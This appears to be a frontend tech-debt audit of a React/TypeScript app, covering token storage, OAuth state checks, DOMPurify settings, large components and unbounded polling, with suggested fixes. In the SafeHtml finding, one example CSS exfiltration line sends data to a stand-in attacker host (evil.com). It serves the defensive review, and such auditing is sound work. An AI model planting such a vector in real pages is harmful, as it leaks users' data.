# Frontend Tech Debt Audit Report — v5

**Date:** 2026-06-02  
**Auditor Role:** Principal Frontend Architect / Senior React Architect / UI Performance Engineer / Staff Security Engineer / Enterprise Solution Architect  
**Framework:** React 18 + TypeScript + Vite + Tailwind CSS  
**Scope:** Full codebase (`frontend/src/`)

---

## 1. 📁 File-Level Tech Debt

---

### File: `src/utils/auth.ts`

**Component/Hook:** `getSessionToken` / `setSessionToken`  
**Line:** 31–36  
**Severity:** 🔴 P0

❌ **Issue:**  
Session token stored in `sessionStorage` is accessible to any JavaScript running on the page. If an XSS vulnerability exists anywhere in the application, the token can be exfiltrated. The comment acknowledges this ("migrate to httpOnly cookies") but the risk remains.

🔍 **Impact:**  
Token theft via XSS leads to full account takeover. Any reflected/stored XSS anywhere in the app chain gives an attacker the session token.

🏗 **Category:** Security

👉 **Suggested Fix:**  
Migrate to httpOnly, Secure, SameSite=Strict cookies for session management:
```typescript
// Backend sets: Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/api
// Frontend: Remove all sessionStorage token logic. Axios automatically sends cookies.
// api/client.ts:
const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL || '/api/v1',
  withCredentials: true, // sends cookies
  headers: { 'Content-Type': 'application/json' },
});
```

👉 **Refactoring Approach:**  
Backend returns `Set-Cookie` on login, frontend removes all token storage/retrieval. `withCredentials: true` on axios handles the rest.

---

### File: `src/api/client.ts`

**Component/Hook:** Axios interceptor  
**Line:** 12–16  
**Severity:** 🟠 P1

❌ **Issue:**  
Token is sent in **both** `Authorization` header AND a custom `x-session-token` header. This doubles the attack surface for token leakage in logs, CORS preflight responses, and browser dev tools. Redundant authentication headers are a code smell and security risk.

🔍 **Impact:**  
Increased token exposure surface; custom headers trigger CORS preflight on every request, adding latency.

🏗 **Category:** Security / Architecture

👉 **Suggested Fix:**
```typescript
api.interceptors.request.use((config) => {
  const token = getSessionToken();
  if (token) {
    config.headers = config.headers || {};
    config.headers.Authorization = `Bearer ${token}`;
    // Remove x-session-token — use only one auth mechanism
  }
  return config;
});
```

---

### File: `src/api/client.ts`

**Component/Hook:** 401 interceptor  
**Line:** 26–43  
**Severity:** 🟡 P2

❌ **Issue:**  
The `isHandling401` flag resets synchronously within the same microtask. Under concurrent API calls that all return 401, the flag provides no actual deduplication since each rejection runs in its own microtask. The logic is effectively a no-op guard.

🔍 **Impact:**  
Multiple `auth:session-expired` events can fire in rapid succession from concurrent requests, though the current `AuthProvider` handles this gracefully. Still, the code is misleading.

🏗 **Category:** Code Smell

👉 **Suggested Fix:**
```typescript
let isHandling401 = false;

api.interceptors.response.use(
  (response) => response,
  (error) => {
    const status = error.response?.status;
    if (status === 401 && !isHandling401) {
      isHandling401 = true;
      clearStoredUser();
      window.dispatchEvent(new CustomEvent('auth:session-expired'));
      // Reset after a tick to deduplicate concurrent 401s
      setTimeout(() => { isHandling401 = false; }, 100);
      return Promise.reject(new Error('Session expired'));
    }
    // ... rest
  }
);
```

---

### File: `src/components/SafeHtml.tsx`

**Component/Hook:** `SafeHtml`  
**Line:** 15  
**Severity:** 🟠 P1

❌ **Issue:**  
`style` attribute is in `ALLOWED_ATTR`. This allows CSS-based exfiltration attacks (e.g., `background-image: url(https://evil.com/steal?data=...)`) and UI redressing. DOMPurify sanitizes JS from style but not all CSS exfiltration vectors.

🔍 **Impact:**  
CSS injection can exfiltrate data character-by-character in targeted attacks, or overlay UI elements to trick users.

🏗 **Category:** Security

👉 **Suggested Fix:**
```typescript
const sanitized = DOMPurify.sanitize(content, {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'b', 'i', 'u', 'a', 'ul', 'ol', 'li',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'span', 'div', 'table', 'thead',
    'tbody', 'tr', 'th', 'td', 'blockquote', 'pre', 'code', 'hr', 'img',
  ],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class', 'src', 'alt', 'width', 'height'],
  // Remove 'style' from ALLOWED_ATTR
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
  FORBID_ATTR: ['style'],
});
```

---

### File: `src/components/SafeHtml.tsx`

**Component/Hook:** `SafeHtml`  
**Line:** 18  
**Severity:** 🟡 P2

❌ **Issue:**  
`img` tag with `src` allowed can trigger server-side request forgery (SSRF) for email-rendered HTML or leak user IP. Also, no `rel="noopener noreferrer"` enforcement on `<a>` tags.

🔍 **Impact:**  
Potential IP/activity tracking of users viewing notification HTML content.

🏗 **Category:** Security

👉 **Suggested Fix:**
```typescript
// Add hook to enforce rel="noopener noreferrer" on all links
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('rel', 'noopener noreferrer');
    node.setAttribute('target', '_blank');
  }
});
```

---

### File: `src/pages/SettingsPage.tsx`

**Component/Hook:** `SettingsPage`  
**Line:** 1–400+ (entire file)  
**Severity:** 🟠 P1

❌ **Issue:**  
Monolithic 400+ line component managing 3 unrelated settings sections (Integrations, Document Rules, File Naming) with 20+ state variables. This violates single-responsibility principle, makes the component extremely hard to test, maintain, or extend.

🔍 **Impact:**  
Any change to one section risks breaking another. Re-renders all sections on any state change. New developers cannot quickly understand the component's scope.

🏗 **Category:** Architecture / Maintainability

👉 **Suggested Fix:**  
Split into sub-components:
```typescript
// pages/settings/SettingsPage.tsx (orchestrator)
// pages/settings/IntegrationsSection.tsx
// pages/settings/DocumentRulesSection.tsx  
// pages/settings/FileNamingSection.tsx
```

👉 **Refactoring Approach:**  
Extract each section into its own component with its own state. The parent just handles section navigation and renders the active section.

---

### File: `src/pages/UploadPage.tsx`

**Component/Hook:** `UploadPage`  
**Line:** 1–500+ (entire file)  
**Severity:** 🟠 P1

❌ **Issue:**  
500+ line component combining batch upload UI, manual upload, history tab, candidate table, and processing view all in one file. Multiple concerns and 15+ state variables.

🔍 **Impact:**  
Poor maintainability, hard to test individual features, unnecessary re-renders on every state change.

🏗 **Category:** Architecture / Maintainability

👉 **Suggested Fix:**  
Extract into:
```
pages/upload/UploadPage.tsx (shell with tabs)
pages/upload/BatchUploadView.tsx
pages/upload/ManualUploadView.tsx
pages/upload/BatchHistoryTab.tsx
pages/upload/CandidateProcessingTable.tsx
```

---

### File: `src/pages/DocumentDetailPage.tsx`

**Component/Hook:** `DocumentDetailPage`  
**Line:** 63–74  
**Severity:** 🟡 P2

❌ **Issue:**  
Auto-polling with `setInterval(poll, 5000)` without any backoff or max-attempt limit. If the document stays in a non-terminal state indefinitely (stuck processing), this will poll forever, wasting bandwidth and server resources.

🔍 **Impact:**  
Continuous unnecessary API calls for stuck documents; potential rate-limiting from backend.

🏗 **Category:** Performance / API Handling

👉 **Suggested Fix:**
```typescript
useEffect(() => {
  if (!detail || TERMINAL_STATUSES.includes(detail.document.processing_status)) return;

  let attempts = 0;
  const MAX_ATTEMPTS = 60; // 5 min max
  
  const poll = () => {
    if (document.visibilityState === 'visible' && attempts < MAX_ATTEMPTS) {
      attempts++;
      loadDataRef.current?.(false);
    }
  };
  const id = setInterval(poll, 5000);
  // ... cleanup
}, [detail?.document.processing_status]);
```

---

### File: `src/pages/DocumentsPage.tsx`

**Component/Hook:** `DocumentsPage`  
**Line:** 58–68  
**Severity:** 🟡 P2

❌ **Issue:**  
Same unbounded polling pattern as `DocumentDetailPage`. Polls every 5 seconds without max attempts.

🔍 **Impact:**  
Identical to above — wasteful continuous polling for indefinitely-stuck documents.

🏗 **Category:** Performance / API Handling

👉 **Suggested Fix:**  
Add max polling attempts and exponential backoff.

---

### File: `src/pages/BatchDetailPage.tsx`

**Component/Hook:** `loadData`  
**Line:** 28–51  
**Severity:** 🟠 P1

❌ **Issue:**  
Fetches documents for **all** batch candidates in parallel chunks on page load. For a batch with 100+ candidates, this fires 20+ parallel API calls (`listDocuments` per candidate). This floods the backend and can cause timeouts for large batches.

🔍 **Impact:**  
N+1 query pattern at the frontend level. Backend overload for large batches, slow page loads, potential HTTP 429 errors.

🏗 **Category:** API Handling / Performance

👉 **Suggested Fix:**  
Request a dedicated batch endpoint that returns all documents for a batch in one call:
```typescript
// Backend: GET /api/v1/batch/{batchId}/documents
// Frontend:
const loadData = useCallback(async () => {
  const detail = await getBatchDetail(batchId);
  setBatch(detail.batch);
  setCandidates(detail.candidates);
  const docs = await getBatchDocuments(batchId); // single call
  setDocuments(docs);
}, [batchId]);
```

---

### File: `src/hooks/useBatchProcessing.ts`

**Component/Hook:** `useBatchProcessing`  
**Line:** 1–130 (entire hook)  
**Severity:** 🟡 P2

❌ **Issue:**  
The hook manages 8 state variables and combines upload, processing, history, and log management. It's a "god hook" that makes testing and reuse difficult. Also, `loadHistory` is not memoized with `useCallback`.

🔍 **Impact:**  
Tight coupling between features; cannot use batch upload logic without also importing processing/history state.

🏗 **Category:** Hooks / Architecture

👉 **Suggested Fix:**  
Split into focused hooks:
```typescript
// useBatchUpload.ts — handles file upload + parse
// useBatchExecution.ts — handles processing start + WebSocket
// useBatchHistory.ts — handles listing past batches
```

---

### File: `src/hooks/useBatchWebSocket.ts`

**Component/Hook:** `useBatchWebSocket`  
**Line:** 97–107  
**Severity:** 🟡 P2

❌ **Issue:**  
The `useEffect` dependency array includes `handleLog`, `handleCandidateStatus`, and `handleSummary` which are `useCallback` handlers. While they're memoized, if any dependency of those callbacks changes, the WebSocket will disconnect and reconnect. This is fragile coupling.

🔍 **Impact:**  
Unexpected WebSocket reconnections if callback deps change in future refactors.

🏗 **Category:** Hooks

👉 **Suggested Fix:**  
Use refs for handlers to avoid effect re-runs:
```typescript
const handleLogRef = useRef(handleLog);
handleLogRef.current = handleLog;
// In effect: ws.on('processing-log', (data) => handleLogRef.current(data));
```

---

### File: `src/services/websocket.ts`

**Component/Hook:** `BatchWebSocketService._cleanup`  
**Line:** 155–175  
**Severity:** 🟡 P2

❌ **Issue:**  
`_cleanup()` calls `this.handlers.clear()` which removes all registered event handlers. If the component re-registers handlers after cleanup (e.g., during reconnect), all previously registered handlers from the hook are lost.

🔍 **Impact:**  
After intentional disconnect + reconnect flow, event handlers may be silently dropped.

🏗 **Category:** Architecture

👉 **Suggested Fix:**  
Only clear handlers on full disposal, not on cleanup for reconnect:
```typescript
disconnect(): void {
  this.intentionalClose = true;
  this._cleanup();
  this.handlers.clear(); // Only clear on full disconnect
}

private _cleanup(): void {
  this._stopHeartbeat();
  if (this.reconnectTimer) { clearTimeout(this.reconnectTimer); this.reconnectTimer = null; }
  if (this.ws) {
    this.ws.onopen = null; this.ws.onmessage = null;
    this.ws.onclose = null; this.ws.onerror = null;
    if (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING) {
      this.ws.close();
    }
    this.ws = null;
  }
  this.batchId = null;
}
```

---

### File: `src/pages/LoginPage.tsx`

**Component/Hook:** `LoginPage`  
**Line:** 28  
**Severity:** 🟡 P2

❌ **Issue:**  
`window.location.href = response.oauth_url` directly navigates to a URL returned from the API without any validation that it points to a legitimate Google domain. If the API is compromised, this becomes an open redirect.

🔍 **Impact:**  
Open redirect → phishing attack vector if backend is compromised or returns tampered data.

🏗 **Category:** Security

👉 **Suggested Fix:**
```typescript
const handleGoogleLogin = async () => {
  const response = await startGoogleLogin(`${window.location.origin}/auth/callback`);
  
  // Validate OAuth URL points to Google
  const url = new URL(response.oauth_url);
  if (!url.hostname.endsWith('.google.com') && url.hostname !== 'accounts.google.com') {
    setError('Invalid OAuth provider URL');
    return;
  }
  window.location.href = response.oauth_url;
};
```

---

### File: `src/pages/AuthCallbackPage.tsx`

**Component/Hook:** `AuthCallbackPage`  
**Line:** 34–40  
**Severity:** 🟡 P2

❌ **Issue:**  
The `callbackLockKey` uses `state` from URL params as part of a session storage key. If the state is very long or contains special characters, this could cause issues. More importantly, the `state` param should be validated against a previously-stored value to prevent CSRF on the OAuth flow.

🔍 **Impact:**  
Without client-side state validation, a CSRF attack could force a login with an attacker's account (login CSRF).

🏗 **Category:** Security

👉 **Suggested Fix:**
```typescript
// Before calling completeGoogleLogin, verify state matches what was stored
const storedState = sessionStorage.getItem('bgv_oauth_state');
if (!storedState || storedState !== state) {
  redirectToLoginWithError('Invalid OAuth state. Please sign in again.');
  return;
}
sessionStorage.removeItem('bgv_oauth_state');
```
Also store the state in `LoginPage.tsx` when initiating:
```typescript
sessionStorage.setItem('bgv_oauth_state', response.state);
```

---

### File: `src/pages/CandidatesPage.tsx`

**Component/Hook:** `CandidatesPage`  
**Line:** 18  
**Severity:** 🟡 P2

❌ **Issue:**  
Hardcoded `limit: 100` with no pagination. If candidates exceed 100, the rest are silently invisible to the user. No way to navigate beyond the first page.

🔍 **Impact:**  
Data loss for users — candidates beyond 100 are invisible. Scalability issue as the platform grows.

🏗 **Category:** Scalability / UX

👉 **Suggested Fix:**  
Add pagination similar to ReviewQueuePage with `page` state and navigation buttons.

---

### File: `src/pages/AuditPage.tsx`

**Component/Hook:** `AuditPage`  
**Line:** 12–13  
**Severity:** 🟡 P2

❌ **Issue:**  
`const today = new Date().toISOString().split('T')[0]` is computed on every render (it's inside the component body but outside state/useMemo). While the value doesn't change, it creates a new string reference each render. More critically, using `useState(today)` means the date filter is fixed to the date the component first mounted — no issue now, but the pattern is fragile.

🔍 **Impact:**  
Minor performance issue; confusing initialization pattern.

🏗 **Category:** Code Smell

👉 **Suggested Fix:**
```typescript
const [dateFrom, setDateFrom] = useState(() => new Date().toISOString().split('T')[0]);
const [dateTo, setDateTo] = useState(() => new Date().toISOString().split('T')[0]);
```

---

### File: `src/pages/ReviewQueuePage.tsx`

**Component/Hook:** `ReviewQueuePage`  
**Line:** 1–400 (entire file)  
**Severity:** 🟡 P2

❌ **Issue:**  
Another large single-file page (400+ lines) with table, modal, toast, bulk actions, and pagination all inline. Toast state management is ad-hoc (`setTimeout` for dismiss).

🔍 **Impact:**  
Maintainability; the notification modal should be its own component.

🏗 **Category:** Architecture / Maintainability

👉 **Suggested Fix:**  
Extract `NotificationHistoryModal` and `ReviewQueueTable` as separate components. Create a reusable `useToast` hook.

---

### File: `src/pages/Dashboard.tsx`

**Component/Hook:** `StatCard` / `STAT_ICON_CONFIG`  
**Line:** 170–240  
**Severity:** 🟡 P2

❌ **Issue:**  
`STAT_ICON_CONFIG` contains JSX elements defined at module scope. This means the JSX is created once and never garbage collected, but more importantly, it couples configuration data with React rendering. The `JSX.Element` type annotation is deprecated.

🔍 **Impact:**  
Minor — affects code organization and type correctness.

🏗 **Category:** Code Smell

👉 **Suggested Fix:**  
Use a render function instead of storing JSX in a config object:
```typescript
const STAT_ICON_CONFIG: Record<string, { iconBg: string; iconColor: string; icon: React.ReactNode }> = { ... };
```

---

### File: `src/components/Layout.tsx`

✅ No critical issues found. Well-structured responsive layout with proper semantic HTML and accessibility attributes.

---

### File: `src/components/ErrorBoundary.tsx`

✅ No issues found. Proper class-based error boundary with reset functionality.

---

### File: `src/components/LoadingSpinner.tsx`

✅ No issues found.

---

### File: `src/components/ErrorMessage.tsx`

✅ No issues found.

---

### File: `src/components/StatusBadge.tsx`

✅ No issues found. Clean mapping pattern.

---

### File: `src/components/ClassificationViewer.tsx`

✅ No issues found.

---

### File: `src/components/OCRResultViewer.tsx`

✅ No issues found.

---

### File: `src/components/ValidationResultViewer.tsx`

✅ No issues found.

---

### File: `src/components/ProcessingTimelineView.tsx`

✅ No issues found.

---

### File: `src/components/ProcessingSummary.tsx`

✅ No issues found.

---

### File: `src/components/LiveExecutionLogs.tsx`

✅ No issues found. Smart auto-scroll with bottom detection.

---

### File: `src/components/layout/NavigationItems.tsx`

✅ No issues found. Clean active state detection and accessible markup.

---

### File: `src/components/layout/UserMenu.tsx`

✅ No issues found. Proper click-outside handling.

---

### File: `src/components/layout/MobileDrawer.tsx`

✅ No issues found. Focus trap for accessibility, escape key handling.

---

### File: `src/components/layout/index.ts`

✅ No issues found. Clean barrel exports.

---

### File: `src/App.tsx`

✅ No issues found. Proper code splitting with lazy loading and suspense boundaries.

---

### File: `src/main.tsx`

✅ No issues found. StrictMode enabled, proper provider nesting.

---

### File: `src/hooks/useAuth.tsx`

✅ No critical issues found. Proper context pattern with multi-tab sync and session expiry handling.

---

### File: `src/types/index.ts`

✅ No issues found. Well-typed interfaces.

---

### File: `src/types/auth.ts`

✅ No issues found.

---

### File: `vite.config.ts`

✅ No issues found. Path aliases configured, proxy setup correct.

---

### File: `tsconfig.json`

✅ No issues found. Strict mode enabled, proper compiler options.

---

### File: `tailwind.config.js`

✅ No issues found. Clean design system extension.

---

### File: `package.json`

**Severity:** 🟡 P2

❌ **Issue:**  
`@types/dompurify` is listed in `dependencies` instead of `devDependencies`. Type packages are only needed at build time.

🔍 **Impact:**  
Slightly larger production Docker image (though tree-shaked from bundle).

🏗 **Category:** Build Configuration

👉 **Suggested Fix:**  
Move `@types/dompurify` to `devDependencies`.

---

### File: `package.json`

**Severity:** 🟡 P2

❌ **Issue:**  
No `lint` or `test` scripts defined. No ESLint, Prettier, or testing framework configured. This means no automated quality enforcement.

🔍 **Impact:**  
Code style inconsistencies, no static analysis catching bugs pre-commit, no test coverage.

🏗 **Category:** Build Configuration / Maintainability

👉 **Suggested Fix:**
```json
{
  "scripts": {
    "lint": "eslint src --ext .ts,.tsx",
    "format": "prettier --write src",
    "test": "vitest",
    "test:coverage": "vitest --coverage"
  }
}
```

---

### File: `src/pages/ProfilePage.tsx`

✅ No issues found. Simple presentational component.

---

## 2. 🔁 Duplication Report

| Duplication Type | Locations | Description |
|---|---|---|
| **Status color mapping** | `UploadPage.tsx` (line 76), `AuditPage.tsx` (`statusColor` in `BatchListView`), `ReviewQueuePage.tsx` (`statusBadge`) | Three different status-to-color mapping functions with overlapping logic. |
| **Polling pattern** | `DocumentDetailPage.tsx`, `DocumentsPage.tsx` | Identical setInterval + visibility API polling logic duplicated in two pages. |
| **Date initialization** | `AuditPage.tsx`, `DocumentsPage.tsx` | Same `new Date().toISOString().split('T')[0]` pattern for default date filters. |
| **Error handling pattern** | All pages | Same `try/catch → setError(err instanceof Error ? err.message : 'fallback')` pattern repeated 15+ times. |
| **Loading/error/data conditional** | All pages | Same `if (loading) return <Spinner>; if (error) return <ErrorMessage>; if (!data) return null;` triplet repeated in every page. |
| **Table header styling** | `BatchHistoryPage`, `CandidatesPage`, `ReviewQueuePage`, `UploadPage` | Identical `<th className="...text-xs font-semibold text-gray-500 uppercase tracking-wider">` on every table. |

---

## 3. 🚨 Critical Tech Debt (P0)

| # | File | Issue | Risk |
|---|---|---|---|
| 1 | `src/utils/auth.ts` | Session token in sessionStorage accessible to XSS | Full account takeover on XSS |
| 2 | `src/pages/AuthCallbackPage.tsx` | No client-side OAuth state validation | Login CSRF — attacker can force login with their account |

---

## 4. ⚠️ High & Medium Debt

### 🟠 P1 (High)

| # | File | Issue |
|---|---|---|
| 1 | `src/api/client.ts` | Duplicate auth headers (Authorization + x-session-token) |
| 2 | `src/components/SafeHtml.tsx` | `style` attribute allowed — CSS exfiltration vector |
| 3 | `src/pages/SettingsPage.tsx` | 400+ line monolithic component |
| 4 | `src/pages/UploadPage.tsx` | 500+ line monolithic component |
| 5 | `src/pages/BatchDetailPage.tsx` | N+1 API calls pattern (per-candidate document fetch) |

### 🟡 P2 (Medium)

| # | File | Issue |
|---|---|---|
| 1 | `src/api/client.ts` | Misleading 401 deduplication logic |
| 2 | `src/components/SafeHtml.tsx` | `img src` allowed without domain restriction |
| 3 | `src/pages/LoginPage.tsx` | No OAuth URL domain validation |
| 4 | `src/pages/DocumentDetailPage.tsx` | Unbounded polling |
| 5 | `src/pages/DocumentsPage.tsx` | Unbounded polling |
| 6 | `src/pages/CandidatesPage.tsx` | No pagination (hardcoded limit:100) |
| 7 | `src/pages/AuditPage.tsx` | Date initialization on every render |
| 8 | `src/pages/ReviewQueuePage.tsx` | Large monolithic component with inline modal |
| 9 | `src/hooks/useBatchProcessing.ts` | God hook — 8 state vars, multiple concerns |
| 10 | `src/hooks/useBatchWebSocket.ts` | Effect deps on callbacks risk reconnection |
| 11 | `src/services/websocket.ts` | `handlers.clear()` on cleanup loses registrations |
| 12 | `package.json` | `@types/dompurify` in wrong dep group |
| 13 | `package.json` | No lint/test scripts |
| 14 | `src/pages/Dashboard.tsx` | JSX in module-level config object |

---

## 5. 💡 Strategic Improvements

### Component Architecture Redesign
- Extract SettingsPage into 3 sub-page components
- Extract UploadPage into shell + feature components
- Extract ReviewQueuePage modal into standalone component
- Create shared `DataTable` component for consistent table rendering

### State Management Improvements
- Create reusable `useAsyncData<T>(fetcher)` hook to eliminate loading/error/data boilerplate
- Extract `usePolling(fetcher, interval, opts)` hook to centralize polling logic with backoff + max attempts
- Split `useBatchProcessing` into focused single-responsibility hooks
- Create a `useToast()` hook for consistent notification management

### Code Splitting Strategies
- Already implemented for pages (lazy loading) ✅
- Consider lazy loading `recharts` only for Dashboard (large library)
- Split SettingsPage sections into lazy-loaded sub-routes

### Lazy Loading Improvements
- Add `React.lazy` for heavy components like `SafeHtml` (DOMPurify) when not always visible
- recharts is 200KB+ gzipped — lazy load it with dynamic import

### Accessibility Improvements
- Add `aria-live="polite"` regions for toast notifications
- Add `aria-label` attributes to icon-only buttons in ReviewQueuePage
- Ensure all form inputs have associated `<label>` elements (some use `placeholder` only)
- Add skip-to-content link in Layout

### Design System Standardization
- Extract status color mappings into a single shared utility
- Create `<Badge variant={status}>` component to replace inline className logic
- Standardize table component with sorting/filtering built-in

### Error Handling Strategy
- Create `ApiError` class with typed status codes
- Implement global error boundary with error reporting
- Add retry logic with exponential backoff to API calls

### Frontend Observability Improvements
- Add structured error logging (e.g., Sentry/DataDog RUM integration point)
- Track page load performance metrics
- Monitor WebSocket connection health

---

## 6. 📊 Frontend Quality Scorecard

| Category | Score |
|---|---|
| Naming | 88/100 |
| Component Design | 68/100 |
| Hooks Usage | 78/100 |
| Performance | 72/100 |
| API Handling | 65/100 |
| Security | 60/100 |
| Accessibility | 75/100 |
| DRY | 62/100 |
| Maintainability | 66/100 |
| State Management | 72/100 |
| Scalability | 65/100 |

**Frontend Score: 70/100**

---

## 7. 📉 Frontend Tech Debt Summary

| Metric | Count |
|---|---|
| **Total Issues** | 21 |
| 🔴 P0 (Critical) | 2 |
| 🟠 P1 (High) | 5 |
| 🟡 P2 (Medium) | 14 |
| **Duplication Cases** | 6 |

**Frontend Tech Debt Level: 🟡 Medium**

---

## 8. 🧾 Final Verdict

### ⚠️ Needs Improvement

**Justification:**

- **Security posture (60/100):** Two P0 critical issues — session token exposed to XSS via sessionStorage (acknowledged in code comments but unfixed), and missing OAuth state validation enabling login CSRF. The SafeHtml component's `style` attribute allowance is a secondary risk. These must be fixed before handling sensitive PII in production.

- **Rendering performance (72/100):** No major performance disasters. Lazy loading is properly implemented. Polling patterns need bounds. The WebSocket buffering strategy is well-designed. recharts import could be lazy-loaded to improve initial bundle.

- **Scalability (65/100):** CandidatesPage has no pagination. BatchDetailPage's N+1 document fetching will not scale beyond 50-100 candidates per batch. The architecture needs dedicated aggregated endpoints.

- **Maintainability (66/100):** Three 400+ line page components violate SRP. Duplicated patterns across pages. No linting or testing infrastructure. However, TypeScript strict mode is enabled which prevents a class of bugs.

- **UX reliability (75/100):** Error boundaries in place, loading states handled consistently, graceful auth expiry handling, proper WebSocket reconnection with exponential backoff. Toast notifications could be more robust.

**Summary:** The application has a solid architectural foundation (code splitting, typed API layer, auth context, WebSocket with reconnect). The main risks are security (token storage, OAuth validation) and maintainability (large components, duplicated patterns, no testing). Addressing the 2 P0 security issues and splitting the monolithic pages would significantly improve production readiness.
